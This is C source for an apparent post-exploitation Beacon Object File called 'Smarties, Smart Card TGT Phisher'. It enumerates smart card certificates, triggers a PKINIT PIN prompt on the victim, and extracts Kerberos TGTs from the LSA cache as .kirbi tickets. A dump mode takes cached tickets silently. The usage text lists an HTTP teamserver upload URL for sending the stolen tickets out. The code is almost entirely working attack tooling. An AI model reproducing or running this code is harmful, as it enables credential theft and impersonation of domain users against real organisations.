static void do_phish(const char *output, const char *spnOverride) {
    HCERTSTORE hStore = CertOpenSystemStoreW(0, L"MY");
    if (!hStore) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open MY certificate store");
        return;
    }

    PCCERT_CONTEXT pCert = findFirstSmartCardCert(hStore);
    if (!pCert) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No suitable smart card certificate found");
        CertCloseStore(hStore, 0);
        return;
    }

    char subjectName[512];
    memset(subjectName, 0, sizeof(subjectName));
    CertGetNameStringA(pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, NULL, subjectName, sizeof(subjectName));
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Using smart card cert: %s", subjectName);

    WCHAR upnW[256];
    memset(upnW, 0, sizeof(upnW));
    if (!getUPN(pCert, upnW, 256)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to extract UPN from certificate");
        CertFreeCertificateContext(pCert);
        CertCloseStore(hStore, 0);
        return;
    }

    char *upn = toNarrow(upnW);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] UPN: %s", upn ? upn : "?");

    WCHAR targetSPN[512];
    memset(targetSPN, 0, sizeof(targetSPN));
    if (spnOverride && spnOverride[0]) {
        LPWSTR wSpn = toWide(spnOverride);
        if (wSpn) { wcscpy(targetSPN, wSpn); bof_free(wSpn); }
    } else {
        WCHAR realm[256];
        memset(realm, 0, sizeof(realm));
        getRealmFromUPN(upnW, realm, 256);
        if (realm[0]) {
            wcscpy(targetSPN, L"krbtgt/");
            wcscat(targetSPN, realm);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Could not determine realm from UPN");
            if (upn) bof_free(upn);
            CertFreeCertificateContext(pCert);
            CertCloseStore(hStore, 0);
            return;
        }
    }

    char *spnNarrow = toNarrow(targetSPN);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target SPN: %s", spnNarrow ? spnNarrow : "?");
    if (spnNarrow) bof_free(spnNarrow);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Triggering PKINIT (PIN dialog will appear on target)...");
    if (!triggerPkinit(pCert, targetSPN)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] PKINIT trigger failed");
        if (upn) bof_free(upn);
        CertFreeCertificateContext(pCert);
        CertCloseStore(hStore, 0);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Retrieving TGT from LSA ticket cache...");
    DWORD kirbiLen = 0;
    BYTE *kirbi = retrieveTgtFromCache(targetSPN, &kirbiLen);

    if (!kirbi || kirbiLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve TGT from cache after PKINIT");
        if (upn) bof_free(upn);
        CertFreeCertificateContext(pCert);
        CertCloseStore(hStore, 0);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got %lu byte .kirbi TGT for %s", kirbiLen, upn ? upn : "?");
    outputKirbi(output, kirbi, kirbiLen);

    bof_free(kirbi);
    if (upn) bof_free(upn);
    CertFreeCertificateContext(pCert);
    CertCloseStore(hStore, 0);
}

/* ================================================================
 *  MODE: DUMP - Extract existing cached TGT (no PIN prompt)
 * ================================================================ */

static void do_dump(const char *output, const char *spnOverride) {
    WCHAR targetSPN[512];
    memset(targetSPN, 0, sizeof(targetSPN));

    if (spnOverride && spnOverride[0]) {
        LPWSTR wSpn = toWide(spnOverride);
        if (wSpn) { wcscpy(targetSPN, wSpn); bof_free(wSpn); }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No SPN specified, trying krbtgt for current domain...");
        wcscpy(targetSPN, L"krbtgt");
    }

    char *spnNarrow = toNarrow(targetSPN);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Cache lookup SPN: %s", spnNarrow ? spnNarrow : "?");
    if (spnNarrow) bof_free(spnNarrow);

    DWORD kirbiLen = 0;
    BYTE *kirbi = retrieveTgtFromCache(targetSPN, &kirbiLen);

    if (!kirbi || kirbiLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No TGT found in cache for specified SPN.\n"
                     "    Hint: specify the full SPN, e.g., krbtgt/DOMAIN.LOCAL");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Extracted %lu byte .kirbi from cache", kirbiLen);
    outputKirbi(output, kirbi, kirbiLen);
    bof_free(kirbi);
}

/* ================================================================
 *  BOF ENTRY POINT
 *
 *  EmeraldStrike's COFF loader looks for a symbol named "go" or
 *  "_go" with signature: void __cdecl go(char *args, int alen)
 *
 *  Arguments are packed by bof_utils.py in CS bof_pack format:
 *    BeaconDataExtract reads: [4-byte LE length][blob bytes]
 *
 *  Expected arguments:
 *    1. mode   : string - "enum", "phish", or "dump"
 *    2. output : string - file path or HTTP URL (optional, can be empty)
 *    3. spn    : string - target SPN override (optional, can be empty)
 * ================================================================ */

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int modeLen = 0;
    char *mode = BeaconDataExtract(&parser, &modeLen);

    int outputLen = 0;
    char *output = BeaconDataExtract(&parser, &outputLen);

    int spnLen = 0;
    char *spn = BeaconDataExtract(&parser, &spnLen);

    if (!mode || modeLen <= 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Usage: smarties <mode> [output] [spn]\n"
            "    Modes:\n"
            "      enum  - List smart card certificates\n"
            "      phish - Trigger PKINIT + dump TGT (pops PIN dialog)\n"
            "      dump  - Dump existing cached TGT\n"
            "    Output:\n"
            "      File path (e.g., C:\\temp\\user.kirbi)\n"
            "      HTTP URL  (e.g., http://teamserver:8080/upload)\n"
            "    SPN:\n"
            "      Override target (default: krbtgt/REALM)");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "=== Smarties BOF - Smart Card TGT Phisher ===\n"
        "[*] Mode: %s", mode);

    if (_stricmp(mode, "enum") == 0) {
        do_enum();
    } else if (_stricmp(mode, "phish") == 0) {
        do_phish(output, spn);
    } else if (_stricmp(mode, "dump") == 0) {
        do_dump(output, spn);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unknown mode: '%s' (use: enum, phish, dump)", mode);
    }
}
